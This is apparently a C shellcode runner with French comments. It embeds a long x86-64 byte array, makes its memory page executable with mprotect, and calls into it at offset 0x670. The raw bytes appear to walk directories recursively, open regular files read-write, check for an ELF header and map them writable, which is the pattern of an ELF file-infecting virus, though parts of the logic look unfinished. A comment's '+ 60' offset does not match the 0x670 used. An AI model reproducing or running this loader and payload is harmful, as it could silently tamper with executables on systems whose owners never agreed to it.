#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>

// Ton shellcode ici
unsigned char shellcode[] = " \
\x55\x48\x89\xe5\x48\x83\xec\x10\x48\x89\x7d\xf8\x48\x83\x7d\xf8\x00\x0f\x85\x05\x00\x00\x00\xe9\x60\x00\x00\x00\x48\x8b\x45\xf8\x48\x83\x78\x08\x00\x0f\x84\x1c\x00\x00\x00\x48\x8b\x45\xf8\x48\x8b\x70\x08\x48\x8b\x45\xf8\x48\x8b\x50\x10\xbf\x0b\x00\x00\x00\xb0\x00\xe8\xb9\x08\x00\x00\x48\x8b\x45\xf8\x48\xc7\x40\x08\x00\x00\x00\x00\x48\x8b\x45\xf8\x83\x38\xff\x0f\x84\x12\x00\x00\x00\x48\x8b\x45\xf8\x8b\x30\xbf\x03\x00\x00\x00\xb0\x00\xe8\x8e\x08\x00\x00\x48\x8b\x45\xf8\xc7\x00\xff\xff\xff\xff\x48\x83\xc4\x10\x5d\xc3\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x40\x00\x55\x48\x89\xe5\x48\x81\xec\xd0\x00\x00\x00\x48\x89\x7d\xf0\x48\x89\x75\xe8\x48\x8b\x45\xf0\xc7\x00\xff\xff\xff\xff\x48\x8b\x45\xf0\x48\xc7\x40\x08\x00\x00\x00\x00\x48\x8b\x45\xf0\x48\xc7\x40\x10\x00\x00\x00\x00\x48\x8b\x45\xf0\x48\xc7\x40\x18\x00\x00\x00\x00\x48\x8b\x75\xe8\xbf\x02\x00\x00\x00\xba\x02\x00\x00\x00\xb0\x00\xe8\x1a\x08\x00\x00\x89\xc1\x48\x8b\x45\xf0\x89\x08\x48\x8b\x45\xf0\x83\x38\xff\x0f\x85\x0c\x00\x00\x00\xc7\x45\xfc\xff\xff\xff\xff\xe9\x61\x01\x00\x00\x48\x8d\x7d\xe3\x31\xf6\xba\x05\x00\x00\x00\xe8\x79\x06\x00\x00\x48\x8b\x45\xf0\x8b\x30\x48\x8d\x55\xe3\x31\xc0\x89\xc7\xb9\x05\x00\x00\x00\xb0\x00\xe8\xcf\x07\x00\x00\x48\x83\xf8\xff\x0f\x85\x0c\x00\x00\x00\xc7\x45\xfc\xff\xff\xff\xff\xe9\x21\x01\x00\x00\x48\x8d\x7d\xe3\x48\x8d\x35\xae\x0e\x00\x00\xba\x04\x00\x00\x00\xe8\x04\x07\x00\x00\x83\xf8\x00\x0f\x84\x0c\x00\x00\x00\xc7\x45\xfc\xff\xff\xff\xff\xe9\xf7\x00\x00\x00\x48\x8d\x7d\xe3\x48\x83\xc7\x04\x48\x8d\x35\x85\x0e\x00\x00\xba\x01\x00\x00\x00\xe8\xd6\x06\x00\x00\x83\xf8\x00\x0f\x84\x0c\x00\x00\x00\xc7\x45\xfc\xff\xff\xff\xff\xe9\xc9\x00\x00\x00\xe9\x00\x00\x00\x00\x48\x8b\x45\xf0\x8b\x30\x48\x8d\x95\x50\xff\xff\xff\xbf\x05\x00\x00\x00\xb0\x00\xe8\x43\x07\x00\x00\x48\x83\xf8\xff\x0f\x85\x0c\x00\x00\x00\xc7\x45\xfc\xff\xff\xff\xff\xe9\x95\x00\x00\x00\x48\x8b\x45\x80\x48\x89\x85\x48\xff\xff\xff\x48\x8b\x8d\x48\xff\xff\xff\x48\x8b\x45\xf0\x48\x89\x48\x10\x48\xc7\x85\x40\xff\xff\xff\x00\x00\x00\x00\x48\x8b\x45\xf0\x48\x8b\x50\x10\x48\x8b\x45\xf0\x44\x8b\x08\x48\x8b\x85\x40\xff\xff\xff\xbf\x09\x00\x00\x00\x31\xf6\xb9\x03\x00\x00\x00\x41\xb8\x02\x00\x00\x00\x48\x89\x04\x24\xb0\x00\xe8\xd5\x06\x00\x00\x48\x89\x85\x38\xff\xff\xff\x48\xc7\xc0\xff\xff\xff\xff\x48\x39\x85\x38\xff\xff\xff\x0f\x85\x0c\x00\x00\x00\xc7\x45\xfc\xff\xff\xff\xff\xe9\x16\x00\x00\x00\x48\x8b\x8d\x38\xff\xff\xff\x48\x8b\x45\xf0\x48\x89\x48\x08\xc7\x45\xfc\x00\x00\x00\x00\x8b\x45\xfc\x48\x81\xc4\xd0\x00\x00\x00\x5d\xc3\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x90\x55\x48\x89\xe5\x48\x89\x7d\xf8\x5d\xc3\x66\x0f\x1f\x44\x00\x00\x55\x48\x89\xe5\x48\x89\x7d\xf8\x48\x89\x75\xf0\xc7\x45\xec\x00\x00\x00\x00\x48\x8b\x45\xf0\x48\x63\x4d\xec\x80\x3c\x08\x00\x0f\x84\x24\x00\x00\x00\x48\x8b\x45\xf0\x48\x63\x4d\xec\x8a\x14\x08\x48\x8b\x45\xf8\x48\x63\x4d\xec\x88\x14\x08\x8b\x45\xec\x83\xc0\x01\x89\x45\xec\xe9\xca\xff\xff\xff\x48\x8b\x45\xf8\x48\x63\x4d\xec\xc6\x04\x08\x00\x5d\xc3\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x55\x48\x89\xe5\x48\x83\xec\x40\x48\x89\x7d\xf8\x48\x89\x75\xf0\x48\x89\x55\xe8\x48\xc7\x45\xe0\x00\x00\x00\x00\x48\xc7\x45\xd8\x00\x00\x00\x00\x48\xc7\x45\xd0\x00\x00\x00\x00\x48\x8b\x45\xf8\x48\x8b\x4d\xe0\x0f\xbe\x0c\x08\x31\xc0\x83\xf9\x00\x88\x45\xcf\x0f\x84\x0e\x00\x00\x00\x48\x8b\x45\xe0\x48\x3b\x45\xe8\x0f\x92\xc0\x88\x45\xcf\x8a\x45\xcf\xa8\x01\x0f\x85\x05\x00\x00\x00\xe9\x11\x00\x00\x00\x48\x8b\x45\xe0\x48\x83\xc0\x01\x48\x89\x45\xe0\xe9\xb7\xff\xff\xff\x48\x8b\x45\xe0\x48\x89\x45\xd0\x48\x8b\x45\xf0\x48\x8b\x4d\xd8\x0f\xbe\x0c\x08\x31\xc0\x83\xf9\x00\x88\x45\xce\x0f\x84\x12\x00\x00\x00\x48\x8b\x45\xe0\x48\x83\xc0\x01\x48\x3b\x45\xe8\x0f\x92\xc0\x88\x45\xce\x8a\x45\xce\xa8\x01\x0f\x85\x05\x00\x00\x00\xe9\x33\x00\x00\x00\x48\x8b\x45\xf0\x48\x8b\x4d\xd8\x8a\x14\x08\x48\x8b\x45\xf8\x48\x8b\x4d\xe0\x88\x14\x08\x48\x8b\x45\xe0\x48\x83\xc0\x01\x48\x89\x45\xe0\x48\x8b\x45\xd8\x48\x83\xc0\x01\x48\x89\x45\xd8\xe9\x91\xff\xff\xff\x48\x8b\x45\xd0\x48\x3b\x45\xe8\x0f\x83\x0c\x00\x00\x00\x48\x8b\x45\xf8\x48\x8b\x4d\xe0\xc6\x04\x08\x00\x48\x8b\x45\xd0\x48\x89\x45\xc0\x48\x8b\x7d\xf0\xe8\xe9\x02\x00\x00\x89\xc1\x48\x8b\x45\xc0\x48\x63\xc9\x48\x01\xc8\x48\x83\xc4\x40\x5d\xc3\x0f\x1f\x80\x00\x00\x00\x00\x55\x48\x89\xe5\x48\x83\xec\x20\x48\x89\x7d\xf8\x48\x89\x75\xf0\x48\x89\x55\xe8\x48\x8b\x7d\xf8\x48\x8b\x75\xf0\xe8\x4f\xfe\xff\xff\x48\x8b\x7d\xf8\x48\x8d\x35\xbb\x0b\x00\x00\xba\x00\x04\x00\x00\xe8\x9a\xfe\xff\xff\x48\x8b\x7d\xf8\x48\x8b\x75\xe8\xba\x00\x04\x00\x00\xe8\x88\xfe\xff\xff\x48\x83\xc4\x20\x5d\xc3\x66\x90\x55\x48\x89\xe5\x48\x83\xec\x10\x48\xc7\x45\xf8\x02\x00\x00\x00\x48\xc7\x45\xf0\x00\x00\x00\x00\x48\x8b\x45\xf0\x48\x3b\x45\xf8\x0f\x83\x25\x00\x00\x00\x48\x8b\x4d\xf0\x48\x8d\x05\x5f\x2b\x00\x00\x48\x8b\x3c\xc8\xe8\x26\x00\x00\x00\x48\x8b\x45\xf0\x48\x83\xc0\x01\x48\x89\x45\xf0\xe9\xcd\xff\xff\xff\x48\x83\xc4\x10\x5d\xc3\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x44\x00\x00\x55\x48\x89\xe5\x48\x81\xec\x40\x0c\x00\x00\x48\x89\x7d\xf8\x48\x8b\x75\xf8\xbf\x02\x00\x00\x00\x31\xd2\xb0\x00\xe8\x0f\x04\x00\x00\x89\x45\xf4\x83\x7d\xf4\xff\x0f\x85\x11\x00\x00\x00\xbf\x3c\x00\x00\x00\xbe\x01\x00\x00\x00\xb0\x00\xe8\xf1\x03\x00\x00\x48\xc7\x85\xe8\xfb\xff\xff\x00\x00\x00\x00\x8b\x75\xf4\x48\x8d\x95\xf0\xfb\xff\xff\xbf\xd9\x00\x00\x00\xb9\x00\x04\x00\x00\xb0\x00\xe8\xcb\x03\x00\x00\x48\x89\x85\xe8\xfb\xff\xff\x48\x83\xbd\xe8\xfb\xff\xff\xff\x0f\x85\x05\x00\x00\x00\xe9\x16\x01\x00\x00\x48\x83\xbd\xe8\xfb\xff\xff\x00\x0f\x85\x05\x00\x00\x00\xe9\xf4\x00\x00\x00\x48\xc7\x85\xe0\xfb\xff\xff\x00\x00\x00\x00\x48\x8b\x85\xe0\xfb\xff\xff\x48\x3b\x85\xe8\xfb\xff\xff\x0f\x83\xd0\x00\x00\x00\x48\x8d\x85\xf0\xfb\xff\xff\x48\x03\x85\xe0\xfb\xff\xff\x48\x89\x85\xd8\xfb\xff\xff\x48\x8b\x85\xd8\xfb\xff\xff\x0f\xb6\x40\x12\x83\xf8\x08\x0f\x85\x3a\x00\x00\x00\x48\x8b\x85\xd8\xfb\xff\xff\x48\x83\xc0\x13\x48\x89\x85\xd0\xfb\xff\xff\x48\x8d\xbd\xd0\xf7\xff\xff\x48\x8b\x75\xf8\x48\x8b\x95\xd0\xfb\xff\xff\xe8\x4d\xfe\xff\xff\x48\x8d\xbd\xd0\xf7\xff\xff\xe8\xb1\x00\x00\x00\xe9\x4f\x00\x00\x00\x48\x8b\x85\xd8\xfb\xff\xff\x0f\xb6\x40\x12\x83\xf8\x04\x0f\x85\x36\x00\x00\x00\x48\x8b\x85\xd8\xfb\xff\xff\x48\x83\xc0\x13\x48\x89\x85\xc8\xf7\xff\xff\x48\x8b\x85\xc8\xf7\xff\xff\x0f\xbe\x00\x83\xf8\x2e\x0f\x84\x0c\x00\x00\x00\x48\x8d\xbd\xc0\xf3\xff\xff\xe8\xa7\xfe\xff\xff\xe9\x00\x00\x00\x00\xe9\x00\x00\x00\x00\x48\x8b\x85\xd8\xfb\xff\xff\x0f\xb7\x40\x10\x48\x03\x85\xe0\xfb\xff\xff\x48\x89\x85\xe0\xfb\xff\xff\xe9\x1c\xff\xff\xff\xe9\xc4\xfe\xff\xff\x8b\x75\xf4\xbf\x03\x00\x00\x00\xb0\x00\xe8\x9b\x02\x00\x00\x48\x81\xc4\x40\x0c\x00\x00\x5d\xc3\x66\x90\x55\x48\x89\xe5\xe8\xf7\xfd\xff\xff\xbf\x3c\x00\x00\x00\x31\xf6\xb0\x00\xe8\x79\x02\x00\x00\x5d\xc3\x0f\x1f\x80\x00\x00\x00\x00\x55\x48\x89\xe5\x48\x83\xec\x30\x48\x89\x7d\xf8\x48\x8d\x7d\xd8\x31\xf6\xba\x20\x00\x00\x00\xe8\xe4\x00\x00\x00\xc7\x45\xd4\x00\x00\x00\x00\x48\x8b\x75\xf8\x48\x8d\x7d\xd8\xe8\xd0\xf9\xff\xff\x89\x45\xd4\x83\x7d\xd4\x00\x0f\x85\x09\x00\x00\x00\x48\x8d\x7d\xd8\xe8\xaa\xfb\xff\xff\x48\x8d\x7d\xd8\xe8\x21\xf9\xff\xff\x48\x83\xc4\x30\x5d\xc3\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\x90\x55\x48\x89\xe5\x48\x89\x7d\xf8\xc7\x45\xf4\x00\x00\x00\x00\x48\x8b\x45\xf8\x48\x63\x4d\xf4\x80\x3c\x08\x00\x0f\x84\x0e\x00\x00\x00\x8b\x45\xf4\x83\xc0\x01\x89\x45\xf4\xe9\xe0\xff\xff\xff\x8b\x45\xf4\x5d\xc3\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x90\x55\x48\x89\xe5\x48\x89\x7d\xf8\x48\x89\x75\xf0\x48\xc7\x45\xe8\x00\x00\x00\x00\x48\x8b\x45\xe8\x48\x3b\x45\xf0\x0f\x83\x2d\x00\x00\x00\x48\x8b\x45\xe8\x48\x83\xe0\x0f\x48\x83\xf8\x0f\x0f\x85\x05\x00\x00\x00\xe9\x00\x00\x00\x00\xe9\x00\x00\x00\x00\x48\x8b\x45\xe8\x48\x83\xc0\x01\x48\x89\x45\xe8\xe9\xc5\xff\xff\xff\x5d\xc3\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x44\x00\x00\x55\x48\x89\xe5\x48\x89\x7d\xf8\x89\x75\xf4\x48\x89\x55\xe8\x48\x8b\x45\xf8\x48\x89\x45\xe0\x48\xc7\x45\xd8\x00\x00\x00\x00\x48\x8b\x45\xd8\x48\x3b\x45\xe8\x0f\x83\x21\x00\x00\x00\x8b\x45\xf4\x88\xc2\x48\x8b\x45\xe0\x48\x8b\x4d\xd8\x88\x14\x08\x48\x8b\x45\xd8\x48\x83\xc0\x01\x48\x89\x45\xd8\xe9\xd1\xff\xff\xff\x48\x8b\x45\xf8\x5d\xc3\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x90\x55\x48\x89\xe5\x48\x89\x7d\xf8\x48\x89\x75\xf0\x48\x89\x55\xe8\x48\x8b\x45\xf8\x48\x89\x45\xe0\x48\x8b\x45\xf0\x48\x89\x45\xd8\x48\xc7\x45\xd0\x00\x00\x00\x00\x48\x8b\x45\xd0\x48\x3b\x45\xe8\x0f\x83\x27\x00\x00\x00\x48\x8b\x45\xd8\x48\x8b\x4d\xd0\x8a\x14\x08\x48\x8b\x45\xe0\x48\x8b\x4d\xd0\x88\x14\x08\x48\x8b\x45\xd0\x48\x83\xc0\x01\x48\x89\x45\xd0\xe9\xcb\xff\xff\xff\x48\x8b\x45\xf8\x5d\xc3\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x00\x55\x48\x89\xe5\x48\x89\x7d\xf0\x48\x89\x75\xe8\x48\x89\x55\xe0\x48\x8b\x45\xf0\x48\x89\x45\xd8\x48\x8b\x45\xe8\x48\x89\x45\xd0\x48\xc7\x45\xc8\x00\x00\x00\x00\x48\x8b\x45\xc8\x48\x3b\x45\xe0\x0f\x83\x58\x00\x00\x00\x48\x8b\x45\xd8\x48\x8b\x4d\xc8\x0f\xb6\x04\x08\x48\x8b\x4d\xd0\x48\x8b\x55\xc8\x0f\xb6\x0c\x11\x39\xc8\x0f\x84\x22\x00\x00\x00\x48\x8b\x45\xd8\x48\x8b\x4d\xc8\x0f\xb6\x04\x08\x48\x8b\x4d\xd0\x48\x8b\x55\xc8\x0f\xb6\x0c\x11\x29\xc8\x89\x45\xfc\xe9\x1d\x00\x00\x00\xe9\x00\x00\x00\x00\x48\x8b\x45\xc8\x48\x83\xc0\x01\x48\x89\x45\xc8\xe9\x9a\xff\xff\xff\xc7\x45\xfc\x00\x00\x00\x00\x8b\x45\xfc\x5d\xc3\x66\x0f\x1f\x44\x00\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\x48\x85\xc0\x78\x01\xc3\x48\xc7\xc0\xff\xff\xff\xff\xc3";

int main() {

	mprotect((void *)((uintptr_t)shellcode & ~(sysconf(_SC_PAGE_SIZE) - 1)), sysconf(_SC_PAGE_SIZE), PROT_READ | PROT_WRITE | PROT_EXEC);

    // Pointeur vers le shellcode + 60 (adresse de la fonction _start)
    void (*func)() = (void (*)())((unsigned char *)shellcode + 0x670);

    // Exécution du shellcode
    func();  // Appel du shellcode

    // Libération de la mémoire

    return 0;
}
